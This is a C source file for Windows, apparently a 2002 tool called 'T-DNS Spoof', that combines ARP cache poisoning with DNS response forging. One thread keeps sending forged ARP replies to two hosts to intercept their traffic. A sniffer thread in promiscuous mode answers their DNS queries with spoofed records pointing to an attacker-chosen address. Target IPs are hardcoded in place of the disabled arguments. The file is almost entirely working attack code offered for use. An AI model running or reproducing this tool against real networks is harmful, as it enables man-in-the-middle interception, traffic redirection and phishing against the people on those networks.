#include "stdafx.h"
#include <packet32.h>
#include <iphlpapi.h>
#include <stdio.h>
#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "IPHlpApi.Lib")
#pragma comment (lib, "wsock32.lib")
 
#define ETH_IP                       0x0800
#define ETH_ARP                      0x0806
#define ARP_REQUEST                  0x0001
#define ARP_REPLY                    0x0002
#define ARP_HARDWARE                 0x0001
#define MAX_NUM_ADAPTER              10
#define NDIS_PACKET_TYPE_PROMISCUOUS 0x0020

#pragma pack(push,1)

typedef struct ethdr
{
	unsigned char  eh_dst[6];
	unsigned char  eh_src[6];
	unsigned short eh_type;
}ETHDR,*PETHDR;

typedef struct arphdr
{
	unsigned short  arp_hdr;
	unsigned short  arp_pro;
	unsigned char   arp_hln;
	unsigned char   arp_pln;
	unsigned short  arp_opt;
	unsigned char   arp_sha[6];
	unsigned long   arp_spa;
	unsigned char   arp_tha[6];
	unsigned long   arp_tpa;
}ARPHDR,*PARPHDR;

typedef struct iphdr
{
	unsigned char  h_lenver;
	unsigned char  tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char  ttl;
	unsigned char  protocol;
	unsigned short checksum;
	unsigned int   sourceip;
	unsigned int   destip;
}IPHDR,*PIPHDR;

typedef struct psd
{
	unsigned int   saddr;
	unsigned int   daddr;
	char           mbz;
	char           ptcl;
	unsigned short udpl;
}PSD,*PPSD;

typedef struct udphdr
{
	unsigned short souceport;
	unsigned short destport;
	unsigned short length;
	unsigned short checksum;
}UDPHDR,*PUDPHDR;

typedef struct dns
{
	unsigned short id;
	unsigned short flags;
	unsigned short quests;
	unsigned short answers;
	unsigned short author;
	unsigned short addition;
}DNS,*PDNS;

typedef struct query
{
	unsigned short type;
	unsigned short classes;
}QUERY,*PQUERY;
    
typedef struct response
{
	unsigned short name; 
	unsigned short type;
	unsigned short classes;
	unsigned int   ttl;
	unsigned short length;
	unsigned int   addr;
}RESPONSE,*PRESPONSE;

#pragma pack(pop)

unsigned short checksum(USHORT *buffer,int size)
{
	unsigned long cksum=0;
	while(size>1)
	{
		cksum+=*buffer++;
		size-=sizeof(unsigned short);
	}
	if(size)
		cksum+=*buffer;
	cksum=(cksum>>16)+(cksum & 0xffff);
	cksum+=(cksum>>16);
	return (unsigned short)(~cksum);
}

LPADAPTER lpadapter=0;
LPPACKET  lppacketr,lppackets;
IPAddr    myip,firstip,secondip,virtualip;
UCHAR     mmac[6]={0},fmac[6]={0},smac[6]={0};
char      adapterlist[MAX_NUM_ADAPTER][1024];

void start()
{
	printf("===[ T-DNS Spoof, by TOo2y       ]===\n");
	printf("===[ E-mail: TOo2y@safechina.net ]===\n");
	printf("===[ Homepage: www.safechina.net ]===\n");
	printf("===[ Date: 10-15-2002            ]===\n\n");
	return;
}

void usage()
{
	printf("Usage:  T-DNS  Firstip  Secondip  Virtualip\n");
	return;
}

DWORD WINAPI sniff(LPVOID no)
{
	printf("\nI am sniffing...\n");      

	char     *buf;
	char     *pchar;
	char     temp[1024];
	char     sendbuf[1024];
	char     recvbuf[1024*250];
	struct   bpf_hdr     *hdr;
	unsigned char        *dname;  
    unsigned long        ulbytesreceived,off,ulen;

	ETHDR    ethr,eths;
	IPHDR    ipr,ips;
	PSD      psds;
    UDPHDR   udpr,udps;
	DNS      dnsr,dnss;
    QUERY    queryr,querys;
	RESPONSE responses;
    
	if(PacketSetHwFilter(lpadapter,NDIS_PACKET_TYPE_PROMISCUOUS)==FALSE)
	{
		printf("Warning: Unable to set the adapter to promiscuous mode!\n");
	}

	if(PacketSetBuff(lpadapter,500*1024)==FALSE)
	{
		printf("PacketSetBuff Error: %d\n",GetLastError());
		return -1;
	}

	if(PacketSetReadTimeout(lpadapter,1)==FALSE)
	{
		printf("Warning: Unable to set the timeout!\n");
	}

	if((lppacketr=PacketAllocatePacket())==FALSE)
	{
		printf("PacketAllocatePacket Receive Error: %d\n",GetLastError());
		return -1;
	}

	PacketInitPacket(lppacketr,(char *)recvbuf,sizeof(recvbuf));

	while(1)
	{
		if(PacketReceivePacket(lpadapter,lppacketr,TRUE)==FALSE)
		{
	    	break;           
		}

    	ulbytesreceived=lppacketr->ulBytesReceived;
    	buf=(char *)lppacketr->Buffer;
    	off=0;

     	while(off<ulbytesreceived)
		{
     		hdr=(struct bpf_hdr *)(buf+off);
	    	off+=hdr->bh_hdrlen;  
	      	pchar=(char *)(buf+off);
    		off=Packet_WORDALIGN(off+hdr->bh_caplen);

    		ethr=*(ETHDR *)pchar;
	     	if(ethr.eh_type==htons(ETH_IP))
			{ 
      			ipr=*(IPHDR *)(pchar+sizeof(ETHDR));
	    		if(ipr.protocol!=17)
				{
		     		continue;
				}
				if((ipr.sourceip!=secondip) && (ipr.sourceip!=firstip))
				{
					continue;
				}

    			udpr=*(UDPHDR *)(pchar+sizeof(ETHDR)+sizeof(IPHDR));
				ulen=ntohs(udpr.length)-sizeof(UDPHDR)-sizeof(DNS)-sizeof(QUERY); 
				dname=(unsigned char *)malloc(ulen*sizeof(unsigned char));
	    		if(udpr.destport==htons(53))                         
				{
      				printf("Get a DNS Packet...\t");           

					memset(sendbuf,0,sizeof(sendbuf));
    				memcpy(&dnsr,pchar+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR),sizeof(DNS));
    				memcpy(dname,pchar+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS),ulen);
	    			memcpy(&queryr.type,pchar+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS)+ulen,2);
		     		memcpy(&queryr.classes,pchar+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS)+ulen+2,2);
 
		    		responses.name=htons(0xC00C);  
			    	responses.type=queryr.type;
			    	responses.classes=queryr.classes;
				    responses.ttl=0xFFFFFFFF;
    				responses.length=htons(4);
	    			responses.addr=virtualip;

			     	querys.classes=queryr.classes;
      				querys.type=queryr.type;

					dnss.id=dnsr.id;
		    		dnss.flags=htons(0x8180);      
			    	dnss.quests=htons(1);
				    dnss.answers=htons(1);
    				dnss.author=0;
	    			dnss.addition=0;

		    		udps.souceport=udpr.destport;
			    	udps.destport=udpr.souceport;
				    udps.length=htons(sizeof(UDPHDR)+sizeof(DNS)+ulen+sizeof(QUERY)+sizeof(RESPONSE));
    				udps.checksum=0;          
				
    				ips.h_lenver=(4<<4|sizeof(IPHDR)/sizeof(unsigned int));
	    			ips.tos=0;
		    		ips.total_len=ntohs(sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS)+ulen+sizeof(QUERY)+sizeof(RESPONSE));
			    	ips.ident=htons(12345);
				    ips.frag_and_flags=0;
    				ips.ttl=255;
	    			ips.protocol=IPPROTO_UDP;
		    		ips.checksum=0;     
			    	ips.sourceip=ipr.destip;
				    ips.destip=ipr.sourceip;

                    psds.saddr=ips.sourceip;
		    		psds.daddr=ips.destip;
			    	psds.mbz=0; 
				    psds.ptcl=IPPROTO_UDP;
    				psds.udpl=htons(sizeof(UDPHDR)+sizeof(DNS)+ulen+sizeof(QUERY)+sizeof(RESPONSE)); 

					memset(temp,0,sizeof(temp));
		    		memcpy(temp,&psds,sizeof(PSD));
			    	memcpy(temp+sizeof(PSD),&udps,sizeof(UDPHDR));
				    memcpy(temp+sizeof(PSD)+sizeof(UDPHDR),&dnss,sizeof(DNS));
    				memcpy(temp+sizeof(PSD)+sizeof(UDPHDR)+sizeof(DNS),dname,ulen);
					memcpy(temp+sizeof(PSD)+sizeof(UDPHDR)+sizeof(DNS)+ulen,&querys,sizeof(QUERY));
			    	memcpy(temp+sizeof(PSD)+sizeof(UDPHDR)+sizeof(DNS)+ulen+sizeof(QUERY),&responses,sizeof(RESPONSE));
				    udps.checksum=checksum((USHORT *)temp,sizeof(PSD)+sizeof(UDPHDR)+sizeof(DNS)+ulen+sizeof(QUERY)+sizeof(RESPONSE)); 
				
					memset(temp,0,sizeof(temp));
	    			memcpy(temp,&ips,sizeof(IPHDR));
		    		ips.checksum=checksum((USHORT *)temp,sizeof(IPHDR));

			    	eths.eh_type=ethr.eh_type;
				    memcpy(&eths.eh_src,&ethr.eh_dst,6);
    				memcpy(&eths.eh_dst,&ethr.eh_src,6);

	    			memcpy(sendbuf,&eths,sizeof(ETHDR));
		    		memcpy(sendbuf+sizeof(ETHDR),&ips,sizeof(IPHDR));
			    	memcpy(sendbuf+sizeof(ETHDR)+sizeof(IPHDR),&udps,sizeof(UDPHDR));
				    memcpy(sendbuf+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR),&dnss,sizeof(DNS));
    				memcpy(sendbuf+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS),dname,ulen);
					memcpy(sendbuf+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS)+ulen,&querys,sizeof(QUERY));
			    	memcpy(sendbuf+sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS)+ulen+sizeof(QUERY),&responses,sizeof(RESPONSE));

				    PacketInitPacket(lppackets,sendbuf,sizeof(ETHDR)+sizeof(IPHDR)+sizeof(UDPHDR)+sizeof(DNS)+ulen+4+sizeof(RESPONSE));
            		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
	    			{
		            	printf("PacketSendPacket in DNS Spoof Error: %d\n",GetLastError());
		            	break;
				    } 
    				printf("Send DNS Spoof Packet Successfully!\n");
	    		}
		    }
    	}
	}
	return 0;
}

DWORD WINAPI arpspoof(LPVOID no)
{
	printf("I am arpspoofing...\n\n");

	char   sendbuf[1024];
	struct sockaddr_in fsin,ssin;
	ETHDR  eth;
	ARPHDR arp;

	fsin.sin_addr.s_addr=firstip;
	ssin.sin_addr.s_addr=secondip;

	eth.eh_type=htons(ETH_ARP);
	arp.arp_hdr=htons(ARP_HARDWARE);
    arp.arp_pro=htons(ETH_IP);
	arp.arp_hln=6;
	arp.arp_pln=4;
	arp.arp_opt=htons(ARP_REPLY);

	do
	{
		memcpy(eth.eh_dst,fmac,6);
		memcpy(arp.arp_tha,fmac,6);
		arp.arp_tpa=firstip;
		arp.arp_spa=secondip;
		memcpy(eth.eh_src,mmac,6);
		memcpy(arp.arp_sha,mmac,6);

		memset(sendbuf,0,sizeof(sendbuf));
		memcpy(sendbuf,&eth,sizeof(eth));
		memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));

		PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket in arpspoof Error: %d\n",GetLastError());
			return -1;
		}
		Sleep(500);

		memcpy(eth.eh_dst,smac,6);
		memcpy(arp.arp_tha,smac,6);
		arp.arp_tpa=secondip;
		arp.arp_spa=firstip;
		memcpy(eth.eh_src,mmac,6);
		memcpy(arp.arp_sha,mmac,6);

		memset(sendbuf,0,sizeof(sendbuf));
		memcpy(sendbuf,&eth,sizeof(eth));
		memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));

		PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket in arpspoof Error: %d\n",GetLastError());
			return -1;
		}
		Sleep(500);
	}while(1);
	
	return 0;
}

BOOL getmac()
{
	HRESULT  hr;
	IPAddr   destip;
	ULONG    pulmac[2];
	ULONG    ullen;

	DWORD             err;
	DWORD             fixedinfosize=0;
	DWORD             adapterinfosize=0;
	PIP_ADAPTER_INFO  padapterinfo;
	PIP_ADDR_STRING   paddrstr;

	if((err=GetAdaptersInfo(NULL,&adapterinfosize))!=0)
	{
		if(err!=ERROR_BUFFER_OVERFLOW)
		{
			printf("GetAdapterInfo size Error: %d\n",GetLastError());
			return FALSE;
		}
	}

	if((padapterinfo=(PIP_ADAPTER_INFO)GlobalAlloc(GPTR,adapterinfosize))==NULL)
	{
		printf("Memory allocation Error: %d\n",GetLastError());
		return FALSE;
	}

	if((err=GetAdaptersInfo(padapterinfo,&adapterinfosize))!=0)
	{
		printf("GetAdaptersInfo Error: %d\n",GetLastError());
		return FALSE;
	}

	memcpy(mmac,padapterinfo->Address,6);      
	paddrstr=&(padapterinfo->IpAddressList);
	myip=inet_addr(paddrstr->IpAddress.String); 
	

	ullen=6;
	memset(pulmac,0xff,sizeof(pulmac));    
	destip=firstip;
	if((hr=SendARP(destip,0,pulmac,&ullen))!=NO_ERROR)
	{
		printf("SendARP firstip Error: %d\n",GetLastError());
		return FALSE;
	}
	memcpy(fmac,pulmac,6);

	memset(pulmac,0xff,sizeof(pulmac));
	destip=secondip;
	if((hr=SendARP(destip,0,pulmac,&ullen))!=NO_ERROR)
	{
		printf("SendARP secondip Error: %d\n",GetLastError());
		return FALSE;
	}
	memcpy(smac,pulmac,6);

	return TRUE;
}


int main(int argc,char *argv[])
{
	HANDLE   thread[2];
	WCHAR    adaptername[8192];
	WCHAR    *name1,*name2;
	ULONG    adapterlength;
	DWORD    threadsid,threadrid;
	int      adapternum=0,open,i;

	system("cls.exe");
	start();
	if(argc!=4)
	{
		usage();
		//return -1;
	}

	//firstip=inet_addr(argv[1]);
	//secondip=inet_addr(argv[2]);
	//virtualip=inet_addr(argv[3]);
	firstip=inet_addr("112.126.107.188");
	secondip=inet_addr("220.181.111.85");
	virtualip=inet_addr("220.181.111.85");

	if(getmac()==FALSE)
	{
		return -1;
	}

	adapterlength=sizeof(adaptername);

	if(PacketGetAdapterNames((char *)adaptername,&adapterlength)==FALSE)
	{
		printf("PacketGetAdapterNames Error: %d\n",GetLastError());
		return -1;
	}

	name1=adaptername;
	name2=adaptername;
	i=0;

	while((*name1!='\0') || (*(name1-1)!='\0'))
	{
		if(*name1=='\0')
		{
			memcpy(adapterlist[i],name2,2*(name1-name2));
			name2=name1+1;
			i++;
		}
		name1++;
	}

	adapternum=i;
	printf("Adapters Installed: \n");
	for(i=0;i<adapternum;i++)
	{
		wprintf(L"%d - %s\n",i+1,adapterlist[i]);   
	}
	do
	{
		printf("\nSelect the number of the adapter to open: ");
		scanf("%d",&open);
		if(open>=1 && open<=adapternum)
			break;
	}while(open<1 || open>adapternum);

	lpadapter=PacketOpenAdapter(adapterlist[open-1]);
	if(!lpadapter || (lpadapter->hFile==INVALID_HANDLE_VALUE))
	{
		printf("PacketOpenAdapter Error: %d\n",GetLastError());
		return -1;
	}

	if((lppackets=PacketAllocatePacket())==FALSE)
	{
		printf("PacketAllocatePacket Send Error: %d\n",GetLastError());
		return -1;
	}

	thread[0]=CreateThread(NULL,0,sniff,NULL,0,&threadrid);
	if(thread[0]==NULL)
	{
		printf("CreateThread for sniffer Error: %d\n",GetLastError());
		return -1;
	}
	thread[1]=CreateThread(NULL,0,arpspoof,NULL,0,&threadsid);
	if(thread[1]==NULL)
	{
		printf("CreateThread for arpspoof Error: %d\n",GetLastError());
		return -1;
	}
	WaitForMultipleObjects(2,thread,FALSE,INFINITE);

	CloseHandle(thread[0]);
	CloseHandle(thread[1]);
	PacketFreePacket(lppackets);
	PacketFreePacket(lppacketr);
	PacketCloseAdapter(lpadapter);

	return 0;
}
